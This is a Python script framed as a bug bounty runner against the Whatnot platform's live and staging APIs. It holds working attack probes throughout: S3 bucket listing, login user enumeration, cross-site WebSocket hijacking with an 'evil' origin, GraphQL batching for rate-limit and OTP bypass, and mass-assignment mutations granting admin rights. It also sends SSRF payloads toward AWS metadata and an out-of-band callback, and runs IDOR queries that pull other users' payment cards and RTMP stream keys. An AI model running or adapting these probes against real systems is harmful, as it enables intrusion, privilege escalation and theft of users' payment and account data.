#!/usr/bin/env python3
"""
Whatnot Bug Bounty — One-Shot Runner
======================================
pip install requests
python3 run.py                                         # no-auth tests
python3 run.py -e you@email.com -p YourPass1!          # + auth tests
python3 run.py -e a@x.com -p P1! -e2 b@x.com -p2 P2!  # + IDOR tests
python3 run.py --ssrf https://YOUR.oast.fun            # + SSRF callback
"""

import requests, json, time, sys, argparse, textwrap
from datetime import datetime

requests.packages.urllib3.disable_warnings()

# ── confirmed endpoints ────────────────────────────────────────────────────────
API          = "https://api.whatnot.com"
LOGIN        = f"{API}/api/login"
VERIFY       = f"{API}/api/verify"
GQL          = f"{API}/seller-api/graphql"
GQL_MAIN     = f"{API}/graphql"
STAGE_GQL    = "https://api.stage.whatnot.com/seller-api/graphql"
OAUTH_AUTH   = f"{API}/seller-api/rest/oauth/authorize"
OAUTH_TOKEN  = f"{API}/seller-api/rest/oauth/token"
S3           = "https://whatnot-public.s3.amazonaws.com"

# try multiple UA/header combos — one of them will get past the version gate
HEADER_SETS = [
    {   # iOS app current
        "Content-Type": "application/json",
        "X-Whatnot-App": "whatnot-ios",
        "User-Agent": "Whatnot/26.15.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
        "Origin": "https://www.whatnot.com",
    },
    {   # Android app current
        "Content-Type": "application/json",
        "X-Whatnot-App": "whatnot-android",
        "User-Agent": "Whatnot/26.15.0 (Linux; Android 14; Pixel 8)",
        "Origin": "https://www.whatnot.com",
    },
    {   # web — no version header
        "Content-Type": "application/json",
        "X-Whatnot-App": "whatnot-web",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Origin": "https://www.whatnot.com",
        "Referer": "https://www.whatnot.com/",
    },
    {   # web with current apollo version stamp
        "Content-Type": "application/json",
        "X-Whatnot-App": "whatnot-web",
        "Apollographql-Client-Name": "web",
        "Apollographql-Client-Version": "20260427-0000",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
        "Origin": "https://www.whatnot.com",
        "Referer": "https://www.whatnot.com/",
    },
]

# ── state ──────────────────────────────────────────────────────────────────────
CONFIRMED = []   # list of dicts ready to paste to HackerOne
WORKING_HEADERS = None

def hdr(token=None):
    h = dict(WORKING_HEADERS or HEADER_SETS[2])
    if token:
        h["Authorization"] = f"Bearer {token}"
    return h

def post(url, body, token=None, timeout=15):
    try:
        return requests.post(url, headers=hdr(token), json=body, timeout=timeout, verify=True)
    except Exception as e:
        return None

def get(url, params=None, token=None, timeout=15):
    try:
        return requests.get(url, headers=hdr(token), params=params,
                            timeout=timeout, verify=True, allow_redirects=False)
    except Exception as e:
        return None

def head(url, timeout=10):
    try:
        return requests.head(url, timeout=timeout, verify=True)
    except Exception as e:
        return None

def gql_req(token, query, variables=None, endpoint=GQL):
    body = {"query": query}
    if variables:
        body["variables"] = variables
    return post(endpoint, body, token)

def banner(title):
    print(f"\n{'─'*60}\n  {title}\n{'─'*60}")

def result(status, title, detail, evidence, report_file=None):
    icon = {"VULN": "🔴 CONFIRMED VULNERABLE",
            "POSSIBLE": "🟡 POSSIBLE",
            "SAFE": "🟢 SAFE",
            "INFO": "🔵 INFO"}.get(status, status)
    print(f"\n  {icon}")
    print(f"  {title}")
    if detail:  print(f"  {detail}")
    if evidence: print(f"  Evidence: {str(evidence)[:200]}")
    if status == "VULN":
        CONFIRMED.append({"title": title, "detail": detail,
                          "evidence": str(evidence), "file": report_file})

# ══════════════════════════════════════════════════════════════════════════════
# UNAUTHENTICATED TESTS
# ══════════════════════════════════════════════════════════════════════════════

def test_s3():
    banner("TEST 1 — S3 Bucket Public Exposure")
    files = {
        "GDPR Draft":  "/regulatory_notices/Candidate+Privacy+Notice+(GDPR)+(DRAFT+8.11)+(ACP).docx.pdf",
        "GST Tax Form": "/Whatnot+gst506+%5BUsers+Name%5D.pdf",
    }
    any_vuln = False
    for name, path in files.items():
        r = head(f"{S3}{path}")
        if r and r.status_code == 200:
            size = r.headers.get("Content-Length", "unknown")
            modified = r.headers.get("Last-Modified", "unknown")
            result("VULN", f"S3: {name} is publicly accessible",
                   f"URL: {S3}{path}",
                   f"HTTP 200 | {size} bytes | Last-Modified: {modified}",
                   "13-s3-bucket-public-exposure.md")
            any_vuln = True
        else:
            code = r.status_code if r else "timeout"
            result("SAFE", f"S3: {name} not accessible", f"HTTP {code}")

    # bucket listing
    r = requests.get(f"{S3}/?list-type=2", timeout=10, verify=True)
    if r.status_code == 200 and "<Key>" in r.text:
        keys = [l.strip().replace("<Key>","").replace("</Key>","")
                for l in r.text.splitlines() if "<Key>" in l]
        result("VULN", "S3: Bucket directory listing ENABLED",
               f"{len(keys)} files enumerated",
               "\n".join(keys[:5]),
               "13-s3-bucket-public-exposure.md")
    else:
        result("INFO", "S3: Directory listing disabled", f"HTTP {r.status_code}")


def test_user_enum(real_email):
    banner("TEST 2 — User Enumeration")
    global WORKING_HEADERS
    fake = f"zzz{int(time.time())}@nonexistentdomainwhatnot.xyz"

    app_types = [
        ("ios",     "iPhone16,1",  "Whatnot/26.15.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)"),
        ("android", "pixel8",      "Whatnot/26.15.0 (Linux; Android 14; Pixel 8)"),
        ("web",     "browser",     "Mozilla/5.0 (Macintosh) AppleWebKit/537.36 Chrome/124.0.0.0"),
    ]

    for app_type, device_id, ua in app_types:
        h = {"Content-Type": "application/json",
             "X-Whatnot-App": f"whatnot-{app_type}",
             "User-Agent": ua,
             "Origin": "https://www.whatnot.com"}
        body_fake = {"email": fake, "password": "WrongPass1!",
                     "device_id": device_id, "app_type": app_type}
        body_real = {"email": real_email, "password": "WrongPass1!",
                     "device_id": device_id, "app_type": app_type}

        t1 = time.time()
        r1 = requests.post(LOGIN, headers=h, json=body_fake, timeout=15, verify=True)
        t1 = time.time() - t1

        t2 = time.time()
        r2 = requests.post(LOGIN, headers=h, json=body_real, timeout=15, verify=True)
        t2 = time.time() - t2

        # skip if still getting version error
        if "upgrade" in r1.text.lower() and "upgrade" in r2.text.lower():
            print(f"  [{app_type}] Version gate still active — trying next header set")
            continue

        # if at least one got through the version gate, save working headers
        if "upgrade" not in r1.text.lower() or "upgrade" not in r2.text.lower():
            WORKING_HEADERS = h
            print(f"  [{app_type}] ✓ Got past version gate")

        if r1.status_code != r2.status_code:
            result("VULN", "User Enumeration: Different HTTP status codes",
                   f"Fake: HTTP {r1.status_code} | Real: HTTP {r2.status_code}",
                   f"Fake body: {r1.text[:100]} | Real body: {r2.text[:100]}",
                   "07-user-enumeration.md")
            return
        elif r1.text != r2.text:
            result("VULN", "User Enumeration: Different response bodies",
                   f"Both HTTP {r1.status_code} but different bodies",
                   f"Fake: {r1.text[:100]} | Real: {r2.text[:100]}",
                   "07-user-enumeration.md")
            return
        elif abs(t1 - t2) > 0.4:
            result("POSSIBLE", "User Enumeration: Timing difference detected",
                   f"Fake: {t1:.3f}s | Real: {t2:.3f}s | Diff: {abs(t1-t2):.3f}s",
                   "Run 10x and average — consistent >300ms gap = confirmed")
            return
        else:
            result("SAFE", f"User enum not detected via [{app_type}]",
                   f"HTTP {r1.status_code}, identical bodies, timing similar")
            return

    result("INFO", "User enum: Could not get past version gate on any header set",
           "Try using Burp Suite to capture real app headers from your Whatnot mobile app")


def test_staging():
    banner("TEST 3 — Staging API Public Accessibility")
    for h in HEADER_SETS:
        r = requests.post(STAGE_GQL, headers=h,
                          json={"query": "{ __typename }"}, timeout=15, verify=True)
        if r.status_code in (200, 401):
            result("VULN", "Staging API is publicly reachable",
                   f"HTTP {r.status_code} on api.stage.whatnot.com",
                   r.text[:200], "05-staging-api-exposed.md")
            # test verbose errors
            r2 = requests.post(STAGE_GQL, headers=h,
                               json={"query": "{ invalidFieldXYZABC }"}, timeout=15)
            if any(x in r2.text.lower() for x in ["stacktrace","elixir","phoenix","ecto","exception"]):
                result("VULN", "Staging API leaks internal stack traces",
                       "Response contains framework internals",
                       r2.text[:300], "05-staging-api-exposed.md")
            return
    result("SAFE", "Staging API blocked from public access", "All header combos returned 403")


def test_oauth_pkce():
    banner("TEST 4 — OAuth PKCE Enforcement")
    params = {"client_id": "probe_test_id", "redirect_uri": "https://example.com/cb",
              "response_type": "code", "scope": "read:inventory", "state": "xyz123"}
    r = get(OAUTH_AUTH, params=params)
    if not r:
        result("INFO", "OAuth PKCE: Could not reach auth endpoint", "Blocked by firewall/WAF")
        return
    loc = r.headers.get("Location", "")
    if r.status_code in (301, 302):
        if "error=invalid_request" in loc or "code_challenge" in loc:
            result("SAFE", "OAuth PKCE enforced — redirect rejected missing code_challenge", loc[:150])
        elif "whatnot.com" in loc or "authorize" in loc:
            result("VULN", "OAuth: Server accepts auth request WITHOUT code_challenge (PKCE missing)",
                   "Redirect proceeded without requiring PKCE — auth code interception possible",
                   f"Redirect to: {loc[:200]}", "03-missing-pkce-oauth.md")
        else:
            result("POSSIBLE", "OAuth PKCE: Unexpected redirect location", loc[:150])
    elif r.status_code == 400:
        if "code_challenge" in r.text.lower():
            result("SAFE", "OAuth PKCE enforced — 400 for missing code_challenge", r.text[:150])
        else:
            result("POSSIBLE", f"OAuth returned 400 — may be invalid client_id, not PKCE check",
                   r.text[:150])
    else:
        result("INFO", f"OAuth PKCE: HTTP {r.status_code}", r.text[:150])


def test_websockets():
    banner("TEST 5 — WebSocket Endpoint Discovery + CSWSH")
    paths = ["/socket/websocket", "/graphql/websocket", "/subscriptions",
             "/live/websocket", "/ws", "/cable", "/api/socket"]
    for path in paths:
        url = f"https://api.whatnot.com{path}"
        try:
            r = requests.get(url, headers={
                "User-Agent": HEADER_SETS[2]["User-Agent"],
                "Origin": "https://www.whatnot.com",
                "Upgrade": "websocket", "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Sec-WebSocket-Version": "13",
            }, timeout=8, verify=True)
            if r.status_code == 101:
                result("VULN", f"WebSocket endpoint found: {path}",
                       "101 Switching Protocols — test CSWSH and unauthenticated subscribe next",
                       str(dict(r.headers))[:200])
                # CSWSH test on same path
                r2 = requests.get(url, headers={
                    "User-Agent": HEADER_SETS[2]["User-Agent"],
                    "Origin": "https://evil-attacker-cswsh-test.com",
                    "Upgrade": "websocket", "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "13",
                }, timeout=8, verify=True)
                if r2.status_code == 101:
                    result("VULN", f"CSWSH: WebSocket accepts evil Origin at {path}",
                           "Cross-site WebSocket hijacking confirmed",
                           str(dict(r2.headers))[:200], "15-cross-site-websocket-hijacking.md")
                else:
                    result("SAFE", f"CSWSH: Evil origin rejected at {path}", f"HTTP {r2.status_code}")
            elif r.status_code not in (404, 502, 503):
                result("POSSIBLE", f"WebSocket path {path} responds (HTTP {r.status_code})",
                       "Non-404 response — worth testing manually with wscat")
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
# AUTHENTICATED TESTS  (need 1+ accounts)
# ══════════════════════════════════════════════════════════════════════════════

def login(email, password, label=""):
    for h in HEADER_SETS:
        for app_type, device_id in [("ios","iPhone16,1"),("android","pixel8"),("web","browser-001")]:
            r = requests.post(LOGIN, headers=h, json={
                "email": email, "password": password,
                "device_id": device_id, "app_type": app_type
            }, timeout=15, verify=True)
            if r.status_code == 200:
                data = r.json()
                token = (data.get("access_token") or data.get("token") or
                         data.get("accessToken") or data.get("data", {}).get("access_token"))
                if token and token.startswith("wn_access_tk"):
                    global WORKING_HEADERS
                    WORKING_HEADERS = h
                    print(f"  ✓ Logged in {label}: {token[:35]}...")
                    return token
                print(f"  Login 200 but no token — body: {r.text[:150]}")
            elif "upgrade" not in r.text.lower() and r.status_code != 400:
                print(f"  Login HTTP {r.status_code}: {r.text[:100]}")
    print(f"  ✗ Could not authenticate {label} — check credentials")
    return None


def test_introspection(token):
    banner("TEST 6 — GraphQL Introspection")
    q = "{ __schema { types { name } } }"
    for ep, name in [(GQL, "seller-api"), (GQL_MAIN, "main api")]:
        # unauthed
        r = requests.post(ep, headers=hdr(), json={"query": q}, timeout=15, verify=True)
        if r.status_code == 200 and "__schema" in r.text and "error" not in r.text.lower():
            result("VULN", f"GraphQL introspection UNAUTHENTICATED on {name}",
                   "Full schema exposed without any token",
                   r.text[:300], "04-graphql-introspection.md")
            continue
        # authed
        r = requests.post(ep, headers=hdr(token), json={"query": q}, timeout=15, verify=True)
        if r.status_code == 200 and "__schema" in r.text and "error" not in r.text.lower():
            result("VULN", f"GraphQL introspection enabled on {name} (authenticated)",
                   "Full schema accessible to any logged-in user",
                   r.text[:300], "04-graphql-introspection.md")
        else:
            result("SAFE", f"Introspection blocked on {name}", r.text[:100])
        # field suggestions even if introspection off
        r2 = requests.post(ep, headers=hdr(token),
                           json={"query": "{ invalidFieldXYZABC123 { id } }"}, timeout=15, verify=True)
        if "did you mean" in r2.text.lower():
            result("VULN", f"GraphQL field suggestions leak schema on {name}",
                   '"Did you mean X?" reveals real field names without introspection',
                   r2.text[:300], "09-graphql-field-suggestion-schema-leak.md")


def test_batching(token):
    banner("TEST 7 — GraphQL Batching (Rate-Limit Bypass)")
    batch = [{"query": "{ __typename }"} for _ in range(10)]
    r = requests.post(GQL, headers=hdr(token), json=batch, timeout=20, verify=True)
    if r.status_code == 200:
        try:
            data = r.json()
            if isinstance(data, list) and len(data) == 10:
                result("VULN", "GraphQL batching ENABLED — rate limit bypass possible",
                       "10 operations in 1 HTTP request all returned results",
                       f"Array of {len(data)} results — OTP brute force amplification confirmed",
                       "08-graphql-batching-rate-limit-bypass.md")
            else:
                result("POSSIBLE", "Batching returned 200 but unexpected shape", str(data)[:200])
        except:
            result("POSSIBLE", "Batching 200 but non-JSON — manual inspection needed", r.text[:200])
    else:
        result("SAFE", "GraphQL batching rejected", f"HTTP {r.status_code}: {r.text[:100]}")


def test_mass_assignment(token):
    banner("TEST 8 — Mass Assignment via GraphQL Mutations")
    mutations = [
        ("updateUser", 'mutation { updateUser(input: { isAdmin: true, isTrustedSeller: true, commissionRate: 0.001 }) { user { id isAdmin isTrustedSeller commissionRate } } }'),
        ("updateProfile", 'mutation { updateProfile(input: { sellerApproved: true, commissionRate: 0.001 }) { profile { sellerApproved commissionRate } } }'),
        ("updateSellerSettings", 'mutation { updateSellerSettings(input: { commissionRate: 0.001, isTrustedSeller: true }) { seller { commissionRate isTrustedSeller } } }'),
    ]
    for name, q in mutations:
        r = requests.post(GQL, headers=hdr(token), json={"query": q}, timeout=15, verify=True)
        if not r:
            continue
        flat = r.text
        if any(x in flat for x in ['"isAdmin":true', '"isTrustedSeller":true', '"commissionRate":0.001']):
            result("VULN", f"Mass assignment CONFIRMED via {name}",
                   "Privileged field accepted and reflected in response",
                   flat[:400], "12-mass-assignment-graphql-mutations.md")
            return
        elif r.status_code == 200 and "errors" not in flat:
            result("POSSIBLE", f"Mass assignment {name} returned 200 — check response manually", flat[:200])
        else:
            result("SAFE", f"Mass assignment blocked for {name}", flat[:100])


def test_ssrf(token, callback_url):
    banner("TEST 9 — SSRF via Product Image URL")
    payloads = [
        ("AWS metadata",          "http://169.254.169.254/latest/meta-data/"),
        ("AWS metadata decimal",  "http://2852039166/latest/meta-data/"),
        ("localhost:4000",        "http://localhost:4000/"),
    ]
    if callback_url:
        payloads.append(("out-of-band callback", callback_url))

    for name, url in payloads:
        q = f'''mutation {{
            createProduct(input: {{
                title: "Test {int(time.time())}", description: "t", price: 1.00,
                images: [{{ url: "{url}" }}]
            }}) {{ product {{ id images {{ url }} }} }}
        }}'''
        r = requests.post(GQL, headers=hdr(token), json={"query": q}, timeout=20, verify=True)
        if not r:
            continue
        if any(x in r.text for x in ["ami-id","instance-id","iam","169.254","local-ipv4","AccessKeyId"]):
            result("VULN", f"SSRF CRITICAL: AWS metadata reached via product image URL ({name})",
                   "Server-side fetch returned AWS metadata — IAM credentials may be exposed",
                   r.text[:500], "14-ssrf-via-product-image-url.md")
        elif callback_url and name == "out-of-band callback":
            result("POSSIBLE", "SSRF: Product created with callback URL — check your interactsh server",
                   "If you receive a DNS/HTTP hit on your callback, blind SSRF is confirmed",
                   r.text[:200])
        else:
            result("SAFE", f"SSRF ({name}): No metadata in response", r.text[:100])


# ══════════════════════════════════════════════════════════════════════════════
# IDOR TESTS  (need 2 accounts)
# ══════════════════════════════════════════════════════════════════════════════

def get_my_id(token):
    r = requests.post(GQL, headers=hdr(token), json={"query": "{ me { id username email } }"},
                      timeout=15, verify=True)
    if r and r.status_code == 200:
        me = r.json().get("data", {}).get("me", {})
        return me.get("id"), me.get("username")
    return None, None


def test_idor_payment(token_a, token_b):
    banner("TEST 10 — IDOR: Payment Card Data")
    b_id, b_user = get_my_id(token_b)
    if not b_id:
        result("INFO", "IDOR payment: Could not get Account B ID — skipping", "")
        return
    print(f"  Account B: {b_user} (ID: {b_id})")

    queries = [
        ("direct user(id)",  f'{{ user(id: "{b_id}") {{ paymentCards {{ cardType cardReference billingAddress {{ line1 city zip }} }} walletAddresses {{ address currency }} }} }}'),
        ("alias bypass",     f'{{ me {{ id }} victim: user(id: "{b_id}") {{ paymentCards {{ cardType cardReference billingAddress {{ line1 zip }} }} }} }}'),
        ("nested via live",  f'{{ livestreams(first:1) {{ edges {{ node {{ user(id: "{b_id}") {{ paymentCards {{ cardType }} }} }} }} }} }}'),
    ]
    for name, q in queries:
        r = requests.post(GQL, headers=hdr(token_a), json={"query": q}, timeout=15, verify=True)
        if not r:
            continue
        flat = r.text
        if "paymentCards" in flat and "null" not in flat.replace('"paymentCards":null','') and "errors" not in flat:
            data = r.json().get("data", {})
            user_data = (data.get("user") or data.get("victim") or {})
            if user_data.get("paymentCards"):
                result("VULN", f"IDOR CRITICAL: Payment card data exposed cross-user ({name})",
                       f"Account A read Account B ({b_user}) payment cards",
                       json.dumps(user_data)[:400], "01-idor-payment-data.md")
                return
        result("SAFE", f"IDOR payment ({name}): data not returned", flat[:100])


def test_idor_stream_token(token_a, token_b):
    banner("TEST 11 — IDOR: Stream Token")
    b_id, b_user = get_my_id(token_b)
    r = requests.post(GQL, headers=hdr(token_a),
                      json={"query": '{ livestreams(status: "playing", first: 5) { edges { node { id title user { id username } } } } }'},
                      timeout=15, verify=True)
    if not r or r.status_code != 200:
        result("INFO", "Stream token IDOR: No active streams or endpoint unavailable", "")
        return

    edges = r.json().get("data", {}).get("livestreams", {}).get("edges", [])
    if not edges:
        result("INFO", "Stream token IDOR: No live streams active right now", "Test when a stream is live")
        return

    for edge in edges:
        node = edge.get("node", {})
        sid = node["id"]
        owner_id = node.get("user", {}).get("id")
        if owner_id == b_id:
            continue
        r2 = requests.post(GQL, headers=hdr(token_a),
                           json={"query": f'{{ live(id: "{sid}") {{ id streamToken status user {{ id username }} }} }}'},
                           timeout=15, verify=True)
        if r2:
            data = r2.json().get("data", {}).get("live", {})
            if data and data.get("streamToken"):
                result("VULN", "IDOR: Stream token returned for another seller's stream",
                       f"Stream {sid} owned by {owner_id} — token visible to different user",
                       json.dumps(data)[:300], "02-stream-token-hijack.md")
                return
    result("SAFE", "Stream token IDOR: streamToken not returned for other users' streams", "")


def test_rtmp_idor(token_a, token_b):
    banner("TEST 12 — IDOR: Multicast RTMP Keys")
    b_id, b_user = get_my_id(token_b)
    if not b_id:
        result("INFO", "RTMP IDOR: Could not get Account B ID", "")
        return
    queries = [
        ("direct", f'{{ user(id: "{b_id}") {{ multicastDestinations {{ platform rtmpUrl streamKey }} }} }}'),
        ("alias",  f'{{ me {{ id }} v: user(id: "{b_id}") {{ multicastDestinations {{ platform rtmpUrl streamKey }} }} }}'),
    ]
    for name, q in queries:
        r = requests.post(GQL, headers=hdr(token_a), json={"query": q}, timeout=15, verify=True)
        if not r:
            continue
        flat = r.text
        if "streamKey" in flat and '"streamKey":null' not in flat and "errors" not in flat:
            result("VULN", f"IDOR: RTMP stream key exposed for {b_user} ({name})",
                   "YouTube/Twitch stream key leaked — attacker can hijack their stream",
                   flat[:300], "17-multicast-rtmp-key-disclosure.md")
            return
    result("SAFE", "RTMP IDOR: stream keys not returned cross-user", "")


# ══════════════════════════════════════════════════════════════════════════════
# FINAL REPORT OUTPUT
# ══════════════════════════════════════════════════════════════════════════════

def print_report():
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    print("\n" + "═"*60)
    print("  CONFIRMED VULNERABILITIES — READY TO SUBMIT")
    print("═"*60)

    if not CONFIRMED:
        print("\n  No confirmed vulnerabilities found with current test scope.")
        print("  Try adding --email / --email2 flags for authenticated tests.")
        return

    for i, v in enumerate(CONFIRMED, 1):
        print(f"\n{'─'*60}")
        print(f"  [{i}] {v['title']}")
        print(f"  Detail: {v['detail']}")
        print(f"  Evidence: {v['evidence'][:150]}")
        if v.get("file"):
            print(f"  Report text: hackerone-submissions/{v['file']}")
        print(f"\n  ▶ SUBMIT AT: https://hackerone.com/whatnot/reports/new?type=team&report_type=vulnerability")

    # save JSON
    out = f"confirmed_{ts}.json"
    with open(out, "w") as f:
        json.dump(CONFIRMED, f, indent=2)
    print(f"\n  Saved to: {out}")
    print(f"  Total confirmed: {len(CONFIRMED)}")
    print("═"*60)


# ══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser()
    p.add_argument("-e",  "--email",     help="Account A email")
    p.add_argument("-p",  "--password",  help="Account A password")
    p.add_argument("-e2", "--email2",    help="Account B email (for IDOR tests)")
    p.add_argument("-p2", "--password2", help="Account B password")
    p.add_argument("--ssrf",             help="Interactsh/Burp callback URL for blind SSRF")
    args = p.parse_args()

    print("═"*60)
    print("  Whatnot Bug Bounty — One-Shot Runner")
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("═"*60)

    # ── unauthenticated tests ──────────────────────────────────────────────
    test_s3()
    test_user_enum(args.email or "test@gmail.com")
    test_staging()
    test_oauth_pkce()
    test_websockets()

    # ── authenticated tests ────────────────────────────────────────────────
    token_a = token_b = None
    if args.email and args.password:
        print("\n[AUTH] Logging in Account A...")
        token_a = login(args.email, args.password, "Account A")
    if args.email2 and args.password2:
        print("[AUTH] Logging in Account B...")
        token_b = login(args.email2, args.password2, "Account B")

    if token_a:
        test_introspection(token_a)
        test_batching(token_a)
        test_mass_assignment(token_a)
        test_ssrf(token_a, args.ssrf)

    if token_a and token_b:
        test_idor_payment(token_a, token_b)
        test_idor_stream_token(token_a, token_b)
        test_rtmp_idor(token_a, token_b)

    print_report()


if __name__ == "__main__":
    main()
